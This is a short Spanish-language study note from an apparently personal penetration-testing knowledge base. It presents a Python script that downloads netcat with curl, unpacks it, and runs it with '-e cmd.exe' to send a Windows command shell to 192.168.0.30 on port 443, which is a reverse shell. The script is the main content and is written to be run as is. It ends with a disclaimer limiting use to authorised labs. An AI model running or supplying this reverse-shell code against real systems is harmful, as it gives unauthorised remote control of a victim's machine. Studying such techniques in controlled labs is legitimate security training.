---
title: "Automatizar Netcat con Python en Windows"
date: 2026-08-27
tags:
  - self-study
  - security-penetration-testing
  - avanzado
status: verified
author: "Juan José Restrepo Rosero"
last_updated: 2026-08-27
---

Podemos automatizar en un solo script de Python que netcat se descargue y se ejecute de esta manera:
```python
import os
import shutil

os.system("curl https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip -o netcat.zip")
shutil.unpack_archive("netcat.zip")
os.chdir("netcat-1.11")
os.system("nc64.exe 192.168.0.30 443 -e cmd.exe")
```
![[Pasted image 20221217090951.png]]

<!-- self-study-knowledge-context -->
## Contexto de estudio
- Dominio: [[MOC-Self-Study#Security & Penetration Testing|Seguridad y pruebas de penetración]].
- Criterio de producción: Ejecuta técnicas únicamente en activos propios o con autorización explícita, alcance documentado y controles de no afectación.
> [!warning] Uso autorizado
> Este material es exclusivamente educativo y defensivo. Practica en laboratorios aislados, CTFs o sistemas para los que dispongas de autorización previa y explícita.
